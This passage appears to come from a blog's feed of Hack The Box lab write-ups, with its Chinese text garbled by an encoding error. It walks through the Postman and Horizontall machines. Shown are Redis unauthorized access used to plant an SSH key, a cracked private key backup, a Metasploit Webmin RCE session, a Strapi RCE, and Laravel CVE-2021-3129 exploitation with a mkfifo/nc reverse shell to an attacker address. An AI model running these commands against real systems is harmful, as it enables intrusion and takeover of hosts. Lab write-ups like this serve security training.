<p>æˆ‘ä»¬å‘ç°ä¸€ä¸ªuploadç›®å½•ï¼Œè®¿é—®å‘ç°åªæœ‰ä¸€äº›å›¾ç‰‡è€Œå·²<br><img src="https://img-blog.csdnimg.cn/b3c145006edb4713a933104a79cae707.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>webæ”»å‡»æ— æœï¼Œé‚£æˆ‘ä»¬å°†æ³¨æ„åŠ›è½¬ç§»åˆ°redisæ•°æ®åº“ä¸Šï¼Œå°è¯•æ˜¯å¦å­˜åœ¨æœªæˆæƒè®¿é—®æ¼æ´<br><img src="https://img-blog.csdnimg.cn/f8887a8690934a50aefef93ab24f104a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>æˆ‘ä»¬é¦–å…ˆå°†æˆ‘ä»¬çš„ssh-keyå†™å…¥åˆ°key.txtæ–‡ä»¶ä¸­<br><img src="https://img-blog.csdnimg.cn/30cc35f7466642ae8fc852db4f111dc6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å†æŠŠkey.txtæ–‡ä»¶å†…å®¹å†™å…¥redisç¼“å­˜ä¸­<br><img src="https://img-blog.csdnimg.cn/3f83ac49ad7546059774aba3c56a198e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">10.10.10.160:6379&gt; config get dir</span><br><span class="line">1) <span class="string">&quot;dir&quot;</span></span><br><span class="line">2) <span class="string">&quot;/var/lib/redis&quot;</span></span><br><span class="line">10.10.10.160:6379&gt; config <span class="built_in">set</span> /var/lib/redis/.ssh</span><br><span class="line">(error) ERR Wrong number of arguments <span class="keyword">for</span> CONFIG <span class="built_in">set</span></span><br><span class="line">10.10.10.160:6379&gt; config <span class="built_in">set</span> dir /var/lib/redis/.ssh</span><br><span class="line">OK</span><br><span class="line">10.10.10.160:6379&gt; config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">10.10.10.160:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">10.10.10.160:6379&gt; <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å°è¯•ç™»å½•åˆ°è¯¥ä¸»æœºä¸Š<br><img src="https://img-blog.csdnimg.cn/795ba910f639419d8987d79f0ec483b2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬ä¸Šä¼ linpeas.shè„šæœ¬åˆ°ç›®æ ‡ä¸»æœºä¸Šå‘ç°ï¼Œä¸»æœºçš„/optç›®å½•ä¸Šå­˜åœ¨ä¸€ä»½ç§é’¥å¤‡ä»½</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redis@Postman:~$ cat /opt/id_rsa.bak</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C</span><br><span class="line"></span><br><span class="line">JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX</span><br><span class="line">cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2</span><br><span class="line">7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6</span><br><span class="line">cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9</span><br><span class="line">1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv</span><br><span class="line">EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP</span><br><span class="line">UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY</span><br><span class="line">Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK</span><br><span class="line">t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS</span><br><span class="line">5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke</span><br><span class="line">P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6</span><br><span class="line">jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge</span><br><span class="line">SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i</span><br><span class="line">l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X</span><br><span class="line">0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p</span><br><span class="line">S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR</span><br><span class="line">hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+</span><br><span class="line">Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V</span><br><span class="line">XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD</span><br><span class="line">b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi</span><br><span class="line">WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh</span><br><span class="line">KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm</span><br><span class="line">npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ</span><br><span class="line">VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W</span><br><span class="line">X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å°†å…¶ä¸‹è½½åˆ°æœ¬æœºï¼Œå¹¶ä½¿ç”¨ssh2john.pyå°†å…¶å“ˆå¸Œå¯¼å‡º<br><img src="https://img-blog.csdnimg.cn/66c4d071bea24d2bb4891441037f3a8d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åä½¿ç”¨johnè¿›è¡Œç ´è§£å¾—åˆ°å¯†ç ï¼Œå¾—åˆ°å¯†ç computer2008ï¼Œç™»å½•åˆ°Mattè´¦æˆ·<br><img src="https://img-blog.csdnimg.cn/40e53a09c8a549a19313e7fb22d13443.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="ææƒroot"><a href="#ææƒroot" class="headerlink" title="ææƒroot"></a>ææƒroot</h2><p>æˆ‘ä»¬è®¿é—®10000ç«¯å£å‘ç°æ˜¯ä¸ªwebminåº”ç”¨ç¨‹åºï¼Œåœ¨EDBå‘ç°å­˜åœ¨RCEæ¼æ´å¹¶åœ¨MSFä¸­é›†æˆ<br><img src="https://img-blog.csdnimg.cn/83ea6c04c24c457e896f109ef6a6cfbf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/ae16ec96fd1d44ceac7112af658419af.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬ç›´æ¥ä½¿ç”¨ç¬¬äºŒä¸ªå¹¶å¡«å†™å¥½å‚æ•°åï¼Œå¾—åˆ°rootæƒé™</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use 2</span><br><span class="line">[*] Using configured payload cmd/unix/reverse_perl</span><br><span class="line">msf6 exploit(linux/http/webmin_packageup_rce) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/http/webmin_packageup_rce):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   PASSWORD                    yes       Webmin Password</span><br><span class="line">   Proxies                     no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit</span><br><span class="line">   RPORT      10000            yes       The target port (TCP)</span><br><span class="line">   SSL        <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI  /                yes       Base path <span class="keyword">for</span> Webmin application</span><br><span class="line">   USERNAME                    yes       Webmin Username</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (cmd/unix/reverse_perl):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Webmin &lt;= 1.910</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> password computer2008</span><br><span class="line">password =&gt; computer2008</span><br><span class="line">msf6 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> rhosts 10.10.10.160</span><br><span class="line">rhosts =&gt; 10.10.10.160</span><br><span class="line">msf6 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> ssl <span class="literal">true</span></span><br><span class="line">[!] Changing the SSL option<span class="string">&#x27;s value may require changing RPORT!</span></span><br><span class="line"><span class="string">ssl =&gt; true</span></span><br><span class="line"><span class="string">msf6 exploit(linux/http/webmin_packageup_rce) &gt; show options </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Module options (exploit/linux/http/webmin_packageup_rce):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Name       Current Setting  Required  Description</span></span><br><span class="line"><span class="string">   ----       ---------------  --------  -----------</span></span><br><span class="line"><span class="string">   PASSWORD   computer2008     yes       Webmin Password</span></span><br><span class="line"><span class="string">   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]</span></span><br><span class="line"><span class="string">   RHOSTS     10.10.10.160     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit</span></span><br><span class="line"><span class="string">   RPORT      10000            yes       The target port (TCP)</span></span><br><span class="line"><span class="string">   SSL        true             no        Negotiate SSL/TLS for outgoing connections</span></span><br><span class="line"><span class="string">   TARGETURI  /                yes       Base path for Webmin application</span></span><br><span class="line"><span class="string">   USERNAME                    yes       Webmin Username</span></span><br><span class="line"><span class="string">   VHOST                       no        HTTP server virtual host</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Payload options (cmd/unix/reverse_perl):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Name   Current Setting  Required  Description</span></span><br><span class="line"><span class="string">   ----   ---------------  --------  -----------</span></span><br><span class="line"><span class="string">   LHOST                   yes       The listen address (an interface may be specified)</span></span><br><span class="line"><span class="string">   LPORT  4444             yes       The listen port</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Exploit target:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Id  Name</span></span><br><span class="line"><span class="string">   --  ----</span></span><br><span class="line"><span class="string">   0   Webmin &lt;= 1.910</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">msf6 exploit(linux/http/webmin_packageup_rce) &gt; set username Matt</span></span><br><span class="line"><span class="string">username =&gt; Matt</span></span><br><span class="line"><span class="string">msf6 exploit(linux/http/webmin_packageup_rce) &gt; set lhost 10.10.14.9</span></span><br><span class="line"><span class="string">lhost =&gt; 10.10.14.9</span></span><br><span class="line"><span class="string">msf6 exploit(linux/http/webmin_packageup_rce) &gt; set ssl true</span></span><br><span class="line"><span class="string">[!] Changing the SSL option&#x27;</span>s value may require changing RPORT!</span><br><span class="line">ssl =&gt; <span class="literal">true</span></span><br><span class="line">msf6 exploit(linux/http/webmin_packageup_rce) &gt; exploit</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/6427bab560c04677b571daeed8ba6947.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
]]></content>
      <categories>
        <category>æœªæˆæƒè®¿é—®æ¼æ´</category>
      </categories>
      <tags>
        <tag>Hack The Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Horizontall</title>
    <url>/2022/01/09/Horizontall/</url>
    <content><![CDATA[<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>ç›®æ ‡ä¸»æœºåªå¼€æ”¾äº†sshå’ŒwebæœåŠ¡<br><img src="https://img-blog.csdnimg.cn/c6ea98b32b994a8f8a0cf9c759db1cee.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬ç›´æ¥è®¿é—®webæœåŠ¡ï¼Œå‘ç°æ˜¯ä¸€ä¸ªæ­£å¸¸çš„ç½‘é¡µï¼Œæ‰«æç›®å½•ä¹Ÿæ²¡æœ‰å‘ç°æœ‰ä»·å€¼çš„ä¿¡æ¯</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster dir -u <span class="string">&quot;http://horizontall.htb/&quot;</span> -w /usr/share/seclists/Discovery/Web-Content/common.txt -e 404,500 -t 50</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/f6b30b44e96d409f934b299e104245eb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<span id="more"></span>

<p>é‚£æˆ‘ä»¬å°†æ³¨æ„åŠ›è½¬ç§»åˆ°å­åŸŸåä¸Šï¼Œå¯¹å­åŸŸåè¿›è¡Œæ·±å…¥æŒ–æ˜ï¼Œå‘ç°äº†ä¸€ä¸ªå­åŸŸåï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å®æ–½æ—ç«™æ³¨å…¥</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster vhost -u http://horizontall.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 100</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2cf9c69827e84e87b9616816c817376d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è®¿é—®è¿™ä¸ªé¡µé¢æ—¶å‘ç°ä½¿ç”¨çš„æ˜¯<code>strapi</code>è¿™ä¸ªCMS<br><img src="https://img-blog.csdnimg.cn/3724c08fac2d427f80427e762141b930.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<!--more-->

<p>æˆ‘ä»¬ä¾ç…§è¿™ä¸ªè·¯å¾„è¿›è¡Œè·¯å¾„çš„æ‰«æï¼Œå‘ç°å­˜åœ¨ä¸€ä¸ªadminç›®å½•ï¼Œæˆ‘ä»¬è®¿é—®å‘ç°ä¼šè·³è½¬åˆ°ç™»å½•è¡¨å•ä¸Š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster dir -u <span class="string">&quot;http://api-prod.horizontall.htb/&quot;</span> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e 404,500 -t 50</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/19c0c71aaef14180949dead326bc5c37.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>å°è¯•äº†ä¸€éSQLæ³¨å…¥ï¼Œå‘ç°ä¸å­˜åœ¨SQLæ³¨å…¥çš„é—®é¢˜ã€‚é‚£æˆ‘ä»¬è½¬å‘ä¸­é—´ä»¶æ¼æ´è¿™ä¸ªæ–¹å‘ä¸Šï¼Œåœ¨EDBä¸ŠæŸ¥æ‰¾åˆ°å­˜åœ¨ä¸€ä¸ªå¯†ç é‡ç½®çš„RCEæ¼æ´<br><img src="https://img-blog.csdnimg.cn/fd1458a74a574a918911ef0a1ae87cfe.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/acf1f0e8aea34dacb917647d4ee1f190.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬ç¼–è¾‘ä¸ºä¸€ä¸ªexpæ–‡ä»¶ï¼Œå¹¶æ‰§è¡Œå®ƒè·å–åˆ°ä¸€ä¸ªç”¨æˆ·äº¤äº’çš„shellç»ˆç«¯ã€‚è¿™é‡Œæ˜¾ç¤ºç”¨æˆ·åå’Œå¯†ç æ˜¯<code>admin:SuperStrongPassword1</code><br><img src="https://img-blog.csdnimg.cn/d93aa5dc52404922aadb13f884d33ccf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç™»å½•è¿›é¡µé¢å‘ç°å­˜åœ¨æ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œä½†æ˜¯è¿™ä¸ªå¹¶ä¸èƒ½è¿›è¡Œæ–‡ä»¶ä¸Šä¼ getshell<br><img src="https://img-blog.csdnimg.cn/8b81cd2146e843a5941549c0bfe46564.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å‘ç°è¿™ä¸ªEXPæ˜¯å­˜åœ¨RCEå‘½ä»¤æ‰§è¡Œçš„åŠŸèƒ½çš„ï¼Œé‚£æˆ‘ä»¬å¯ä»¥åœ¨äº¤äº’ç»ˆç«¯ä¸Šè¿›è¡Œåå¼¹ä¸€ä¸ªshellç»™æˆ‘ä»¬<br><img src="https://img-blog.csdnimg.cn/88522af59e4e42d2bd77c449691c2e62.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>æˆ‘ä»¬å°†linpeas.shè„šæœ¬ä¸‹è½½åˆ°ç›®æ ‡æœºå™¨ä¸Šï¼Œå°è¯•çœ‹çœ‹æœ‰æ²¡æœ‰å­˜åœ¨ææƒçš„çªç ´ç‚¹<br><img src="https://img-blog.csdnimg.cn/a7e43564181146d0b3e82efaac54674a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿è¡Œè„šæœ¬åï¼Œä½†æ˜¯æˆ‘ä»¬å¹¶æ²¡æœ‰å‘ç°ä»»ä½•å¯ææƒçš„ç‚¹ï¼Œä½†æ˜¯æˆ‘ä»¬æŸ¥çœ‹ä¸»æœºè¿è¡Œçš„ç«¯å£å¯ä»¥å‘ç°ï¼Œä¸»æœºçš„1337ç«¯å£æ­£åœ¨ä»¥rootèº«ä»½è¿è¡Œç¨‹åºï¼Œç”±äºæˆ‘ä»¬ç”¨nmapæ— æ³•æ‰«æå‡ºè¯¥ç«¯å£ï¼Œå¯ä»¥æ¨æ–­ä¸»æœºåšäº†å†…ç½‘ç«¯å£çš„è½¬å‘ã€‚<br><img src="https://img-blog.csdnimg.cn/0638be03f2764c3f9db143944921a40f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨frpè¿›è¡Œå†…ç½‘çš„ç«¯å£å¤ç”¨ï¼Œé¦–å…ˆå…ˆå°†<code>frpc</code>å’Œ<code>frpc.ini</code>ä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºä¸Šï¼Œä¸Šä¼ æˆåŠŸåè®¾ç½®å¥½æˆ‘ä»¬æœ¬æœºçš„ipåœ°å€å’Œè¦è½¬å‘æœ¬åœ°ç«¯å£å’Œè¿œç¨‹ç«¯å£<br><img src="https://img-blog.csdnimg.cn/5b03de7f59a043c887497c243c893d3d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åœ¨ç›®æ ‡æœºå™¨å’Œæœ¬æœºä¸Šåˆ†åˆ«å¼€å¯ç›‘å¬æœåŠ¡<br><img src="https://img-blog.csdnimg.cn/28bf83b3599646c89714b357a407787f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åæˆ‘ä»¬è®¿é—®æœ¬æœºçš„8000ç«¯å£ï¼Œå‘ç°æ˜¯ä¸€ä¸ªç”±Laravelæ¡†æ¶æ­å»ºèµ·æ¥çš„ç½‘é¡µç¨‹åº<br><img src="https://img-blog.csdnimg.cn/8581ba2866b940708a56f715327a7152.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™ä¸ªåº”ç”¨ç¨‹åºè¿‘å¹´å‘ç°ä¸€ä¸ªå­˜åœ¨RCEçš„æ¼æ´ï¼Œåœ¨githubä¸Šå¯ä»¥æœåˆ°å¯¹åº”çš„EXPæ¼æ´åˆ©ç”¨è„šæœ¬ï¼Œå¹¶æ‰§è¡Œå¯è§æ¼æ´åˆ©ç”¨æˆåŠŸ<br><a href="https://github.com/LucifielHack/CVE-2021-3129_exploit">https://github.com/LucifielHack/CVE-2021-3129_exploit</a><br><img src="https://img-blog.csdnimg.cn/e95aaf54fdb343a199cf7ec03bc27d52.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åå¼¹ä¸€ä¸ªrootçš„shellåˆ°æœ¬æœºä¸Š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./exploit.py http://localhost:8000 Monolog/RCE1 <span class="string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.25 4445 &gt;/tmp/f&quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/9d4a8f62eb834cb78ddc826a02de9132.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/db008ce7bfb14ce78f99c0d2534651e1.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
]]></content>
      <categories>
        <category>ä¸­é—´ä»¶</category>
      </categories>
      <tags>
        <tag>Hack The Box</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2022/01/09/tmux%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE/</url>
